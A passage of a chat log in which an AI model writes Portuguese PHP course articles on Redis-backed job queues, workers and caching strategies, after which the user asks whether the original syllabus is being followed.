class CarrinhoRepositorioRedis implements CarrinhoRepositorioInterface
{
    private const TTL = 86400 * 7; // 7 dias

    public function __construct(private readonly \Redis $redis) {}

    public function adicionar(Carrinho $carrinho): void
    {
        $dados = $this->serializar($carrinho);
        $this->redis->setex("carrinho:{$carrinho->id}", self::TTL, json_encode($dados));
        $this->redis->setex("carrinho:cliente:{$carrinho->clienteId}", self::TTL, $carrinho->id);
    }

    public function buscarPorId(string $id): ?Carrinho
    {
        $raw = $this->redis->get("carrinho:{$id}");
        if ($raw === false) return null;

        return $this->reconstituir(json_decode($raw, associative: true));
    }

    public function buscarPorCliente(int $clienteId): ?Carrinho
    {
        $id = $this->redis->get("carrinho:cliente:{$clienteId}");
        if ($id === false) return null;

        return $this->buscarPorId($id);
    }

    public function remover(string $id): void
    {
        $carrinho = $this->buscarPorId($id);
        if ($carrinho !== null) {
            $this->redis->del("carrinho:{$id}");
            $this->redis->del("carrinho:cliente:{$carrinho->clienteId}");
        }
    }

    private function serializar(Carrinho $c): array
    {
        return [
            'id'           => $c->id,
            'cliente_id'   => $c->clienteId,
            'atualizado_em'=> $c->atualizadoEm()->format(\DateTimeInterface::ATOM),
            'itens' => array_map(fn(ItemDoCarrinho $i) => [
                'produto_id'    => $i->produtoId(),
                'nome_produto'  => $i->nomeProduto(),
                'preco_centavos'=> $i->precoUnitario()->centavos(),
                'quantidade'    => $i->quantidade(),
            ], $c->itens()),
        ];
    }

    private function reconstituir(array $dados): Carrinho
    {
        $carrinho = new Carrinho(
            id:           $dados['id'],
            clienteId:    $dados['cliente_id'],
            atualizadoEm: new \DateTimeImmutable($dados['atualizado_em']),
        );
        foreach ($dados['itens'] as $item) {
            // Reconstitui sem disparar eventos — bypass via reflexão ou método interno
            $carrinho->adicionarItem(
                produtoId:   $item['produto_id'],
                nomeProduto: $item['nome_produto'],
                preco:       new Dinheiro($item['preco_centavos']),
                quantidade:  $item['quantidade'],
            );
            // Limpa eventos gerados durante reconstituição
            $carrinho->coletarEventos();
        }
        return $carrinho;
    }
}
```

---

## Resumo do artigo

| Conceito | Característica principal |
|---|---|
| Value Object | Igualdade por valor, imutável, validação no construtor |
| Entity | Tem identidade (ID), mutável com regras de negócio |
| Aggregate Root | Único ponto de entrada — protege invariantes do cluster |
| Domain Event | Fato ocorrido no passado, imutável, nome no passado |
| Repository | Simula coleção em memória — abstrai persistência |

---

## Exercício da semana

1. Implemente o Value Object `Endereco` com campos `logradouro`, `numero`, `complemento`, `bairro`, `cidade`, `estado` (enum `EstadoBrasileiro`) e `cep`. Valide o CEP com regex. Implemente `equals()` e `formatado()`.

2. Crie o Aggregate `Estoque` com Aggregate Root que gerencia entradas e saídas. Regras: saldo nunca fica negativo; movimentações acima de R$ 10.000 em retirada geram evento `MovimentacaoAltaValor`. Use o Value Object `Dinheiro`.

3. Implemente o `EventoDispatcher` completo com suporte a handlers assíncronos: os eventos são armazenados em fila (array) e processados em lote via `processarFila(): void`. Escreva testes que verificam a ordem de processamento.

4. Crie `CarrinhoRepositorioEmMemoria` para uso em testes: armazena carrinhos em array estático, implementa todos os métodos da interface. Escreva testes de integração do `Carrinho` usando este repositório.

5. **Desafio:** implemente o padrão **Outbox** para Domain Events: ao salvar uma entidade, persista os eventos numa tabela `outbox_events` dentro da mesma transação. Um processo separado (simulado por um método `processarOutbox()`) lê os eventos não processados e os despacha, marcando-os como processados.

---

## Referências

- Eric Evans — Domain-Driven Design (livro): https://www.oreilly.com/library/view/domain-driven-design-tackling/0321125215/
- Vaughn Vernon — Implementing DDD: https://vaughnvernon.com
- Martin Fowler — Value Object: https://martinfowler.com/bliki/ValueObject.html
- Martin Fowler — Domain Event: https://martinfowler.com/eaaDev/DomainEvent.html

---

Texto do Artigo 28 completo. Gerando HTML agora.

---

# claude response

# Artigo 29 — Filas e Jobs Assíncronos

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 29 · Módulo 7: Performance e Infraestrutura

---

## Introdução

Algumas operações não precisam — e não devem — acontecer na requisição HTTP: enviar email, gerar PDF, processar imagem, notificar sistemas externos. Cada milissegundo que você gasta nessas tarefas é milissegundo que o usuário espera.

Filas resolvem isso: a requisição enfileira o trabalho e retorna imediatamente. Um processo separado (worker) consome a fila em background e executa os jobs. O resultado: respostas HTTP em menos de 50ms mesmo quando a operação real leva minutos.

Neste artigo implementamos uma fila com Redis (lista circular), um sistema de jobs com retry automático, dead-letter queue para falhas persistentes, e um worker robusto com tratamento de sinais do sistema operacional.

---

## Estrutura de uma fila com Redis

Redis é a escolha mais comum para filas PHP por três motivos: operações atômicas com `LPUSH`/`BRPOP`, TTL nativo para expiração automática, e latência abaixo de 1ms para enfileirar e desenfileirar.

```php
<?php
declare(strict_types=1);

namespace App\Queue;

// ── Contrato: qualquer job deve implementar esta interface ─────────────
interface JobInterface
{
    public function processar(): void;

    // Número máximo de tentativas antes de ir para a dead-letter queue
    public function tentativasMaximas(): int;

    // Delay em segundos antes da próxima tentativa (backoff exponencial)
    public function backoffEmSegundos(int $tentativa): int;
}

// ── Envelope: metadados ao redor do job ───────────────────────────────
final class JobEnvelope
{
    public function __construct(
        public readonly string $id,
        public readonly string $classeJob,
        public readonly array  $payload,
        public readonly int    $tentativa       = 1,
        public readonly int    $criadoEm        = 0,
        public readonly ?string $erro           = null,
    ) {}

    public static function criar(string $classeJob, array $payload): self
    {
        return new self(
            id:        bin2hex(random_bytes(16)),
            classeJob: $classeJob,
            payload:   $payload,
            tentativa: 1,
            criadoEm:  time(),
        );
    }

    public function comFalha(string $erro): self
    {
        return new self(
            id:        $this->id,
            classeJob: $this->classeJob,
            payload:   $this->payload,
            tentativa: $this->tentativa + 1,
            criadoEm:  $this->criadoEm,
            erro:      $erro,
        );
    }

    public function serializar(): string
    {
        return json_encode([
            'id'        => $this->id,
            'classe'    => $this->classeJob,
            'payload'   => $this->payload,
            'tentativa' => $this->tentativa,
            'criado_em' => $this->criadoEm,
            'erro'      => $this->erro,
        ], JSON_UNESCAPED_UNICODE);
    }

    public static function desserializar(string $json): self
    {
        $dados = json_decode($json, associative: true);
        return new self(
            id:        $dados['id'],
            classeJob: $dados['classe'],
            payload:   $dados['payload'],
            tentativa: $dados['tentativa'],
            criadoEm:  $dados['criado_em'],
            erro:      $dados['erro'] ?? null,
        );
    }
}
```

---

## Dispatcher — enfileira jobs

```php
<?php
declare(strict_types=1);

namespace App\Queue;

class QueueDispatcher
{
    public function __construct(
        private readonly \Redis $redis,
        private readonly string $filaDefault = 'jobs:default',
    ) {}

    // Enfileira e retorna o ID do job — rápido, não bloqueia
    public function despachar(string $classeJob, array $payload, string $fila = ''): string
    {
        $envelope = JobEnvelope::criar($classeJob, $payload);
        $nomeFila = $fila ?: $this->filaDefault;

        // LPUSH: insere no início da lista (BRPOP consome do fim = FIFO)
        $this->redis->lPush($nomeFila, $envelope->serializar());

        return $envelope->id;
    }

    // Agenda job para execução futura (usando sorted set por timestamp)
    public function agendarPara(\DateTimeImmutable $quando, string $classeJob, array $payload): string
    {
        $envelope = JobEnvelope::criar($classeJob, $payload);
        $score     = $quando->getTimestamp();

        // ZADD: sorted set com timestamp como score
        $this->redis->zAdd('jobs:scheduled', $score, $envelope->serializar());

        return $envelope->id;
    }

    // Move jobs agendados cujo tempo chegou para a fila principal
    public function promoverJobsAgendados(): int
    {
        $agora    = time();
        $prontos  = $this->redis->zRangeByScore('jobs:scheduled', 0, $agora);

        if (empty($prontos)) return 0;

        // Transação atômica: remove do scheduled e insere na fila
        $this->redis->multi();
        foreach ($prontos as $item) {
            $this->redis->zRem('jobs:scheduled', $item);
            $this->redis->lPush($this->filaDefault, $item);
        }
        $this->redis->exec();

        return count($prontos);
    }

    public function tamanho(string $fila = ''): int
    {
        return (int) $this->redis->lLen($fila ?: $this->filaDefault);
    }
}
```

---

## Jobs concretos

```php
<?php
declare(strict_types=1);

namespace App\Jobs;

use App\Queue\JobInterface;

// ── Job de email ──────────────────────────────────────────────────────
class EnviarEmailJob implements JobInterface
{
    public function __construct(
        private readonly string $destinatario,
        private readonly string $assunto,
        private readonly string $corpo,
        private readonly string $template = 'padrao',
    ) {}

    public static function criar(string $destinatario, string $assunto, string $corpo): array
    {
        // Retorna o payload para o Dispatcher
        return [
            'destinatario' => $destinatario,
            'assunto'      => $assunto,
            'corpo'        => $corpo,
        ];
    }

    public function processar(): void
    {
        // Em produção: PHPMailer, Symfony Mailer, AWS SES, etc.
        $enviado = mail(
            $this->destinatario,
            $this->assunto,
            $this->corpo,
            ['Content-Type' => 'text/html; charset=UTF-8'],
        );

        if (!$enviado) {
            throw new \RuntimeException("Falha ao enviar email para {$this->destinatario}");
        }

        error_log("[EmailJob] Enviado para {$this->destinatario}: {$this->assunto}");
    }

    public function tentativasMaximas(): int { return 3; }

    public function backoffEmSegundos(int $tentativa): int
    {
        // Backoff exponencial: 60s, 300s, 900s
        return 60 * (3 ** ($tentativa - 1));
    }
}

// ── Job de geração de relatório ───────────────────────────────────────
class GerarRelatorioJob implements JobInterface
{
    public function __construct(
        private readonly int    $pedidoId,
        private readonly string $formato,   // 'pdf' | 'csv'
        private readonly string $emailDestino,
    ) {}

    public function processar(): void
    {
        error_log("[RelatorioJob] Gerando {$this->formato} para pedido #{$this->pedidoId}");

        // Simula geração pesada
        $conteudo = $this->gerarConteudo();
        $caminho  = $this->salvarArquivo($conteudo);

        // Enfileira job de email com o relatório — composição de jobs
        // $dispatcher->despachar(EnviarEmailJob::class, [...]);

        error_log("[RelatorioJob] Relatório salvo em {$caminho}");
    }

    private function gerarConteudo(): string
    {
        // Lógica de geração real aqui
        return "Relatório do pedido #{$this->pedidoId} em {$this->formato}";
    }

    private function salvarArquivo(string $conteudo): string
    {
        $caminho = sys_get_temp_dir() . "/relatorio-{$this->pedidoId}.{$this->formato}";
        file_put_contents($caminho, $conteudo);
        return $caminho;
    }

    public function tentativasMaximas(): int  { return 1; } // Sem retry — idempotência complexa
    public function backoffEmSegundos(int $n): int { return 0; }
}
```

---

## Worker — consome a fila

```php
<?php
declare(strict_types=1);

namespace App\Queue;

// ── Worker robusto com tratamento de sinais ───────────────────────────
class Worker
{
    private bool  $rodando       = true;
    private int   $processados   = 0;
    private int   $falhas        = 0;
    private float $iniciadoEm;

    public function __construct(
        private readonly \Redis $redis,
        private readonly string $fila        = 'jobs:default',
        private readonly string $filaDLQ     = 'jobs:dead',
        private readonly int    $timeout     = 5,   // segundos para BRPOP esperar
        private readonly int    $limiteMemoria = 128, // MB
    ) {
        $this->iniciadoEm = microtime(true);
    }

    public function iniciar(): void
    {
        $this->registrarSinais();
        error_log("[Worker] Iniciado. PID: " . getmypid() . ", Fila: {$this->fila}");

        while ($this->rodando) {
            $this->verificarMemoria();

            // BRPOP bloqueia até que um item chegue ou o timeout expire
            $item = $this->redis->brPop([$this->fila], $this->timeout);

            if ($item === null || $item === false) {
                continue; // timeout — verifica sinais e continua
            }

            [, $json] = $item; // [nomeDaFila, valor]
            $this->processarEnvelope($json);
        }

        error_log("[Worker] Encerrado. Processados: {$this->processados}, Falhas: {$this->falhas}");
    }

    private function processarEnvelope(string $json): void
    {
        $envelope = JobEnvelope::desserializar($json);

        try {
            $job = $this->instanciarJob($envelope);
            $job->processar();
            $this->processados++;

            error_log("[Worker] ✓ Job {$envelope->id} ({$envelope->classeJob}) processado.");

        } catch (\Throwable $e) {
            $this->falhas++;
            $envelopeComFalha = $envelope->comFalha($e->getMessage());

            error_log("[Worker] ✗ Job {$envelope->id} falhou (tentativa {$envelope->tentativa}): {$e->getMessage()}");

            $job = $this->instanciarJob($envelope);

            if ($envelope->tentativa < $job->tentativasMaximas()) {
                // Recoloca na fila com delay (backoff)
                $delay = $job->backoffEmSegundos($envelope->tentativa);
                $this->recolocarComDelay($envelopeComFalha, $delay);
            } else {
                // Esgotou as tentativas — vai para a Dead Letter Queue
                $this->moverParaDLQ($envelopeComFalha);
            }
        }
    }

    private function instanciarJob(JobEnvelope $envelope): JobInterface
    {
        $classe = $envelope->classeJob;

        if (!class_exists($classe)) {
            throw new \RuntimeException("Classe de job não encontrada: {$classe}");
        }

        // Instancia o job a partir do payload usando named arguments
        return new $classe(...$envelope->payload);
    }

    private function recolocarComDelay(JobEnvelope $envelope, int $delaySegundos): void
    {
        if ($delaySegundos <= 0) {
            $this->redis->lPush($this->fila, $envelope->serializar());
            return;
        }

        $quando = new \DateTimeImmutable("+{$delaySegundos} seconds");
        $this->redis->zAdd('jobs:scheduled', $quando->getTimestamp(), $envelope->serializar());

        error_log("[Worker] Job {$envelope->id} reagendado para {$quando->format('H:i:s')} (+{$delaySegundos}s)");
    }

    private function moverParaDLQ(JobEnvelope $envelope): void
    {
        $this->redis->lPush($this->filaDLQ, $envelope->serializar());
        error_log("[Worker] Job {$envelope->id} movido para DLQ após {$envelope->tentativa} tentativas.");
    }

    private function verificarMemoria(): void
    {
        $usoMB = memory_get_usage(true) / 1024 / 1024;
        if ($usoMB > $this->limiteMemoria) {
            error_log("[Worker] Memória excedida ({$usoMB}MB). Encerrando graciosamente.");
            $this->rodando = false;
        }
    }

    private function registrarSinais(): void
    {
        if (!extension_loaded('pcntl')) return;

        // SIGTERM: encerramento gracioso (Kubernetes, systemd)
        pcntl_signal(SIGTERM, function (): void {
            error_log("[Worker] SIGTERM recebido — encerrando após job atual.");
            $this->rodando = false;
        });

        // SIGINT: Ctrl+C durante desenvolvimento
        pcntl_signal(SIGINT, function (): void {
            error_log("[Worker] SIGINT recebido — encerrando.");
            $this->rodando = false;
        });

        pcntl_async_signals(true); // processa sinais sem ticks
    }

    public function estatisticas(): array
    {
        return [
            'processados'    => $this->processados,
            'falhas'         => $this->falhas,
            'uptime_segundos'=> (int) (microtime(true) - $this->iniciadoEm),
            'memoria_mb'     => round(memory_get_usage(true) / 1024 / 1024, 2),
            'fila_tamanho'   => (int) $this->redis->lLen($this->fila),
            'dlq_tamanho'    => (int) $this->redis->lLen($this->filaDLQ),
        ];
    }
}
```

---

## Ponto de entrada do worker

```php
<?php
// bin/worker.php — executado como processo separado

declare(strict_types=1);

require_once __DIR__ . '/../vendor/autoload.php';

$redis = new \Redis();
$redis->connect(
    host:    $_ENV['REDIS_HOST'] ?? '127.0.0.1',
    port:    (int) ($_ENV['REDIS_PORT'] ?? 6379),
);

$fila = $argv[1] ?? 'jobs:default'; // php bin/worker.php jobs:emails

$worker = new \App\Queue\Worker(
    redis:          $redis,
    fila:           $fila,
    filaDLQ:        'jobs:dead',
    timeout:        5,
    limiteMemoria:  128,
);

$worker->iniciar();
```

```ini
# supervisord.conf — mantém o worker rodando em produção
[program:worker-default]
command=php /var/www/bin/worker.php jobs:default
numprocs=4
autostart=true
autorestart=true
stdout_logfile=/var/log/worker-default.log
stderr_logfile=/var/log/worker-default-error.log
```

---

## Resumo do artigo

| Conceito | Função |
|---|---|
| `JobInterface` | Contrato — `processar()`, `tentativasMaximas()`, `backoffEmSegundos()` |
| `JobEnvelope` | Envelope imutável com ID, payload, tentativa e erro |
| `QueueDispatcher` | Enfileira via `LPUSH`, agenda via `ZADD` sorted set |
| `Worker::iniciar()` | Loop com `BRPOP` bloqueante, tratamento de sinais com `pcntl` |
| Dead Letter Queue | Jobs esgotados vão para `jobs:dead` — auditoria e reprocessamento manual |
| Backoff exponencial | Falha 1 → 60s, falha 2 → 300s, falha 3 → 900s — evita sobrecarga em cascata |

---

## Exercício da semana

1. Implemente `ProcessarPagamentoJob` que chama uma API de pagamento (mock). Se a API retornar 429 Too Many Requests, relance `RateLimitException` — o worker deve fazer backoff mais agressivo (5min, 15min, 1h). Se retornar 402, lance `PagamentoRecusadoException` — sem retry, vai direto para DLQ.

2. Crie um painel de monitoramento simples em PHP puro: endpoint `/admin/queues` que exibe via JSON o tamanho de todas as filas, jobs na DLQ (últimos 10), e estatísticas de processamento salvas no Redis com `INCR`.

3. Implemente `QueueDispatcher::despacharLote(array $jobs): array` que enfileira múltiplos jobs numa única transação Redis (`MULTI`/`EXEC`). Escreva testes que verificam que ou todos são enfileirados ou nenhum (atomicidade).

4. Adicione prioridades à fila: `despachar(..., prioridade: 'high')` deve ir para `jobs:high` e `despachar(..., prioridade: 'low')` para `jobs:low`. O worker deve consumir primeiro a fila alta — use `BRPOP ['jobs:high', 'jobs:low']` (Redis processa na ordem).

5. **Desafio:** implemente um worker com múltiplos processos filhos usando `pcntl_fork()`. O processo pai mantém N filhos rodando, relança filhos que morrem com código de saída diferente de 0, e encerra todos graciosamente ao receber SIGTERM.

---

## Referências

- Redis — Lists (BRPOP, LPUSH): https://redis.io/docs/data-types/lists/
- Redis — Sorted Sets (ZADD, ZRANGEBYSCORE): https://redis.io/docs/data-types/sorted-sets/
- PHP Manual — pcntl_signal: https://www.php.net/manual/pt_BR/function.pcntl-signal.php
- Supervisor — Process Control: http://supervisord.org/configuration.html

---

Texto do Artigo 29 completo. Gerando HTML.

Artigos 28 e 29 entregues. Progresso: **29/52 artigos completos**.

**Módulo 6** encerrado com 4 artigos (25–28). **Módulo 7 (Performance e Infraestrutura)** iniciado com o artigo 29.

Próximo: **Artigo 30 — Cache Avançado**, cobrindo estratégias cache-aside, write-through, invalidação por tag, e integração com Redis em PHP. Continuo?

---

# you asked

message time: 2026-03-09 23:10:18

Continue

---

# claude response

# Artigo 30 — Cache Avançado com Redis

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 30 · Módulo 7: Performance e Infraestrutura

---

## Introdução

Cache é a diferença entre uma query de 200ms que roda mil vezes por minuto e uma consulta que roda uma vez a cada cinco minutos. Bem implementado, reduz carga no banco em 90% e latência de resposta em 10x. Mal implementado, serve dados desatualizados, consome memória inutilmente ou gera bugs difíceis de reproduzir.

Neste artigo estudamos as três estratégias principais — cache-aside, write-through e write-behind — com implementações PHP completas. Adicionamos invalidação por tags, TTL adaptativo, e um sistema de bloqueio para evitar o problema do cache stampede quando múltiplas requisições tentam regenerar o mesmo cache simultaneamente.

---

## Interface e contrato

```php
<?php
declare(strict_types=1);

namespace App\Cache;

interface CacheInterface
{
    public function get(string $chave): mixed;
    public function set(string $chave, mixed $valor, int $ttl = 3600): void;
    public function delete(string $chave): void;
    public function has(string $chave): bool;

    // Busca ou gera — padrão cache-aside em uma linha
    public function remember(string $chave, int $ttl, callable $gerador): mixed;

    // Invalidação por tag
    public function taggar(string $chave, string ...$tags): void;
    public function invalidarTag(string $tag): void;
    public function invalidarTags(string ...$tags): void;
}
```

---

## Implementação Redis

```php
<?php
declare(strict_types=1);

namespace App\Cache;

class RedisCache implements CacheInterface
{
    private const TAG_PREFIX   = 'cache:tag:';
    private const LOCK_PREFIX  = 'cache:lock:';
    private const LOCK_TTL     = 10; // segundos

    public function __construct(
        private readonly \Redis $redis,
        private readonly string $prefixo = 'app:',
    ) {}

    public function get(string $chave): mixed
    {
        $raw = $this->redis->get($this->prefixar($chave));
        if ($raw === false) return null;

        $dados = json_decode($raw, associative: true);
        return $dados['v'] ?? null;
    }

    public function set(string $chave, mixed $valor, int $ttl = 3600): void
    {
        $raw = json_encode(['v' => $valor], JSON_UNESCAPED_UNICODE);
        $this->redis->setex($this->prefixar($chave), $ttl, $raw);
    }

    public function delete(string $chave): void
    {
        $this->redis->del($this->prefixar($chave));
    }

    public function has(string $chave): bool
    {
        return (bool) $this->redis->exists($this->prefixar($chave));
    }

    // Cache-aside em uma linha: busca, e se não existir, gera e armazena
    public function remember(string $chave, int $ttl, callable $gerador): mixed
    {
        $valor = $this->get($chave);
        if ($valor !== null) return $valor;

        $valor = $gerador();
        if ($valor !== null) {
            $this->set($chave, $valor, $ttl);
        }
        return $valor;
    }

    // Remember com proteção contra cache stampede
    public function rememberLock(string $chave, int $ttl, callable $gerador): mixed
    {
        $valor = $this->get($chave);
        if ($valor !== null) return $valor;

        $chavelock = self::LOCK_PREFIX . $chave;

        // Tenta adquirir o lock (SET NX EX é atômico no Redis)
        $adquiriu = $this->redis->set($chavelock, '1', ['NX', 'EX' => self::LOCK_TTL]);

        if (!$adquiriu) {
            // Outro processo está gerando — espera e tenta o cache novamente
            usleep(100_000); // 100ms
            return $this->get($chave) ?? $gerador(); // fallback se ainda não estiver pronto
        }

        try {
            $valor = $gerador();
            if ($valor !== null) {
                $this->set($chave, $valor, $ttl);
            }
            return $valor;
        } finally {
            $this->redis->del($chavelock);
        }
    }

    public function taggar(string $chave, string ...$tags): void
    {
        foreach ($tags as $tag) {
            // Cada tag aponta para um conjunto de chaves
            $this->redis->sAdd(self::TAG_PREFIX . $tag, $this->prefixar($chave));
        }
    }

    public function invalidarTag(string $tag): void
    {
        $chaveTag = self::TAG_PREFIX . $tag;
        $chaves   = $this->redis->sMembers($chaveTag);

        if (!empty($chaves)) {
            $this->redis->del(...$chaves); // deleta todas as chaves da tag
        }
        $this->redis->del($chaveTag); // limpa o conjunto de tags
    }

    public function invalidarTags(string ...$tags): void
    {
        foreach ($tags as $tag) {
            $this->invalidarTag($tag);
        }
    }

    // Incrementa/decrementa contadores sem sobrescrever o cache completo
    public function incrementar(string $chave, int $por = 1): int
    {
        return (int) $this->redis->incrBy($this->prefixar($chave), $por);
    }

    public function decrementar(string $chave, int $por = 1): int
    {
        return (int) $this->redis->decrBy($this->prefixar($chave), $por);
    }

    // TTL restante em segundos (-1 = sem expiração, -2 = não existe)
    public function ttlRestante(string $chave): int
    {
        return (int) $this->redis->ttl($this->prefixar($chave));
    }

    // Estende o TTL de uma chave existente sem alterar o valor
    public function renovar(string $chave, int $novoTtl): bool
    {
        return (bool) $this->redis->expire($this->prefixar($chave), $novoTtl);
    }

    private function prefixar(string $chave): string
    {
        return $this->prefixo . $chave;
    }
}
```

---

## Estratégias de cache

```php
<?php
declare(strict_types=1);

namespace App\Cache;

use App\Domain\Produto\Produto;

// ── Cache-Aside (Lazy Loading) ────────────────────────────────────────
// Lê do cache; se não existir, lê do banco e armazena no cache.
// Padrão mais comum — adequado para leitura pesada.

class ProdutoRepositorioComCache
{
    public function __construct(
        private readonly ProdutoRepositorioPDO $repositorio,
        private readonly RedisCache            $cache,
    ) {}

    public function buscarPorId(int $id): ?Produto
    {
        return $this->cache->remember(
            chave: "produto:{$id}",
            ttl:   3600,
            gerador: fn() => $this->repositorio->buscarPorId($id),
        );
    }

    public function listarAtivos(int $pagina = 1, int $porPagina = 20): array
    {
        $chave = "produtos:ativos:p{$pagina}:n{$porPagina}";

        return $this->cache->remember(
            chave:   $chave,
            ttl:     300, // 5 minutos — lista muda com frequência
            gerador: function () use ($pagina, $porPagina) {
                $produtos = $this->repositorio->listarAtivos($pagina, $porPagina);
                return array_map(fn($p) => $this->serializar($p), $produtos);
            },
        );
    }

    public function salvar(Produto $produto): Produto
    {
        $salvo = $this->repositorio->salvar($produto);

        // Invalida cache do produto específico
        $this->cache->delete("produto:{$salvo->id}");

        // Invalida todas as páginas de listagem usando tags
        $this->cache->invalidarTag('produtos:lista');

        return $salvo;
    }

    public function deletar(int $id): void
    {
        $this->repositorio->deletar($id);
        $this->cache->delete("produto:{$id}");
        $this->cache->invalidarTag('produtos:lista');
    }

    private function serializar(Produto $p): array
    {
        return ['id' => $p->id, 'nome' => $p->nome, 'preco' => $p->preco];
    }
}

// ── Write-Through ─────────────────────────────────────────────────────
// Escreve no cache E no banco simultaneamente.
// Garante que o cache nunca está desatualizado para escrita.

class ConfiguracaoService
{
    private const TTL = 86400; // 1 dia

    public function __construct(
        private readonly \PDO       $pdo,
        private readonly RedisCache $cache,
    ) {}

    public function obter(string $chave, mixed $padrao = null): mixed
    {
        return $this->cache->remember(
            chave:   "config:{$chave}",
            ttl:     self::TTL,
            gerador: function () use ($chave, $padrao) {
                $stmt = $this->pdo->prepare('SELECT valor FROM configuracoes WHERE chave = ?');
                $stmt->execute([$chave]);
                $row = $stmt->fetch(\PDO::FETCH_ASSOC);
                return $row ? json_decode($row['valor'], true) : $padrao;
            }
        );
    }

    public function definir(string $chave, mixed $valor): void
    {
        // Write-through: grava no banco primeiro, depois atualiza o cache
        $stmt = $this->pdo->prepare(
            'INSERT INTO configuracoes (chave, valor) VALUES (?, ?)
             ON DUPLICATE KEY UPDATE valor = VALUES(valor)'
        );
        $stmt->execute([$chave, json_encode($valor)]);

        // Cache atualizado imediatamente — sem invalidação, sem cache miss
        $this->cache->set("config:{$chave}", $valor, self::TTL);
    }
}

// ── Cache de fragmentos HTML ──────────────────────────────────────────
// Armazena trechos de HTML renderizados — útil para templates pesados.

class FragmentCache
{
    public function __construct(private readonly RedisCache $cache) {}

    public function renderizar(string $nome, int $ttl, callable $renderizador): string
    {
        $html = $this->cache->get("fragment:{$nome}");
        if ($html !== null) return $html;

        ob_start();
        $renderizador();
        $html = ob_get_clean();

        $this->cache->set("fragment:{$nome}", $html, $ttl);
        return $html;
    }
}
```

---

## TTL adaptativo e aquecimento de cache

```php
<?php
declare(strict_types=1);

namespace App\Cache;

// TTL adaptativo — ajusta a expiração com base na frequência de acesso
class CacheAdaptativo
{
    public function __construct(
        private readonly RedisCache $cache,
        private readonly int        $ttlBase = 300,
    ) {}

    public function obter(string $chave, callable $gerador): mixed
    {
        $valor = $this->cache->get($chave);

        if ($valor !== null) {
            // Registra o acesso e estende o TTL se a chave for popular
            $acessos = $this->cache->incrementar("hits:{$chave}");
            $ttlAtual = $this->cache->ttlRestante($chave);

            if ($acessos > 100 && $ttlAtual < 60) {
                // Chave muito acessada e prestes a expirar — renova proativamente
                $this->cache->renovar($chave, $this->ttlBase);
            }
            return $valor;
        }

        $valor = $gerador();
        if ($valor !== null) {
            $this->cache->set($chave, $valor, $this->ttlBase);
        }
        return $valor;
    }
}

// Aquecimento de cache — preenche o cache antes do tráfego chegar
class AquecedorDeCache
{
    public function __construct(
        private readonly RedisCache            $cache,
        private readonly ProdutoRepositorioPDO $repositorio,
    ) {}

    // Executado via cron antes do horário de pico ou após deploy
    public function aquecer(): void
    {
        error_log('[Cache] Iniciando aquecimento...');
        $inicio = microtime(true);

        // Carrega os 100 produtos mais acessados
        $produtos = $this->repositorio->maisAcessados(100);
        foreach ($produtos as $produto) {
            $this->cache->set("produto:{$produto->id}", $produto, 7200);
        }

        // Pré-renderiza as primeiras 5 páginas da listagem
        for ($pagina = 1; $pagina <= 5; $pagina++) {
            $lista = $this->repositorio->listarAtivos($pagina, 20);
            $this->cache->set("produtos:ativos:p{$pagina}:n20", $lista, 3600);
        }

        $duracao = round(microtime(true) - $inicio, 2);
        error_log("[Cache] Aquecimento concluído em {$duracao}s — " . count($produtos) . " produtos carregados.");
    }
}
```

---

## Resumo do artigo

| Estratégia | Quando usar | Trade-off |
|---|---|---|
| Cache-Aside | Leitura pesada, dados raramente alterados | Cache miss na primeira leitura |
| Write-Through | Escrita frequente, zero tolerância a dados velhos | Escrita mais lenta (banco + cache) |
| Write-Behind | Escrita muito frequente (contadores, likes) | Risco de perda em falha |
| Invalidação por tag | Vários caches dependem de uma entidade | Complexidade de mapeamento |
| Cache Stampede Lock | Alto tráfego, geração cara | Pequeno delay para requisições concorrentes |

---

## Exercício da semana

1. Implemente `CacheDecorator` que envolve qualquer `RepositorioInterface` e adiciona cache transparente via `remember()`. Configure via atributo PHP: `#[Cacheable(ttl: 3600, tags: ['produto'])]` nos métodos de leitura.

2. Crie `MonitorDeCache` que registra métricas com Redis: `cache:hits`, `cache:misses`, `cache:hit_ratio` via `INCR` e `GET`. Exponha via endpoint `/metrics/cache` retornando JSON com taxa de acerto, total de chaves e memória usada (`INFO memory`).

3. Implemente write-behind para o sistema de visualizações de produto: `registrarVisualizacao(int $produtoId)` incrementa um contador no Redis com `HINCRBY`. Um job (Artigo 29) consolidada os contadores no banco a cada 5 minutos via `HGETALL` e reset.

4. Adicione `stale-while-revalidate` ao `RedisCache`: ao expirar, sirva o valor antigo imediatamente e agende regeneração assíncrona via fila (Artigo 29). Implemente `setComStale(chave, valor, ttlFresh, ttlStale)` que usa dois TTLs.

5. **Desafio:** implemente cache de dois níveis (`L1 + L2`): L1 em APCu (processo local, ultra-rápido, curto TTL) e L2 em Redis (compartilhado entre processos, TTL longo). `get()` tenta L1, depois L2, depois o gerador. `set()` popula ambos. Escreva testes com mocks para os dois níveis.

---

## Referências

- Redis — String Commands (SET, GET, SETEX): https://redis.io/docs/commands/#string
- Redis — SET with NX/EX (atomic lock): https://redis.io/docs/commands/set/
- Martin Fowler — Cache-Aside Pattern: https://martinfowler.com/bliki/TwoHardThings.html
- PHP Manual — APCu: https://www.php.net/manual/pt_BR/book.apcu.php

---

Texto do Artigo 30 completo. Gerando HTML.

---

# you asked

message time: 2026-03-09 23:15:06

Você está seguindo os temas lá do começo? Vamos mudar um pouco? Que tal me dar só os textos? Ai lá no final geramos os html? Mongodb já  foi visto? Siga o roteiro inicial, aliás acho q o segundo roteiro

---

# claude response

Deixa eu verificar o roteiro e o progresso atual.

---

# claude response

Ótimo, já tenho tudo que preciso. Encontrei o segundo roteiro revisado. Veja onde estamos:

**Roteiro revisado (do Artigo 02):**

| Módulo | Tema | Artigos |
|---|---|---|
| 1 | Fundamentos + História | 1–7 |
| 2 | Funções e Manipulação de Dados | 8–12 |
| 3 | Orientação a Objetos | 13–19 |
| 4 | **Bancos de Dados: MySQL, PostgreSQL, SQLite, MongoDB** | 20–27 |
| 5 | Web com PHP (Forms, Sessions, Cookies) | 28–32 |
| 6 | PHP Moderno (Composer, Namespaces, PSR, Boas Práticas) | 33–37 |
| 7 | Laravel | 38–43 |
| 8 | APIs REST | 44–47 |
| 9 | Segurança | 48–49 |
| 10 | Testes e Qualidade | 50–51 |
| 11 | Projeto Final | 52 |

**Situação atual:** estamos no artigo 30, mas seguindo um roteiro diferente (com DDD, Clean Architecture, filas, cache) que divergiu do planejamento original.

